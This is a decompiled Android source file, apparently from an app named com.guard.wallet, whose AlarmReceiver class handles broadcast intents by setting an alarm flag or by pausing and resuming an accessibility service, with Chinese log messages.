package com.guard.wallet.receiver;

import a1.AbstractC0026q;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Objects;
import p005h.C0318e;

/* loaded from: classes.dex */
public class AlarmReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        try {
            String concat = context.getPackageName().concat(".alarm.action");
            if (Objects.equals(concat, intent.getAction())) {
                Log.d("AlarmReceiver", "onReceive:" + concat);
                if (C0318e.m844S() != null) {
                    C0318e.m844S().f608B.set(true);
                    return;
                }
                return;
            }
            if (Objects.equals(context.getPackageName().concat(".pause.accessibility"), intent.getAction())) {
                Log.d("AlarmReceiver", "onReceive 暂停 Accessibility Service");
                MyAccessibilityService.f322r.set(true);
            } else if (Objects.equals(context.getPackageName().concat(".resume.accessibility"), intent.getAction())) {
                Log.d("AlarmReceiver", "onReceive 恢复 Accessibility Service");
                MyAccessibilityService.f322r.set(false);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("AlarmReceiver", e2);
        }
    }
}
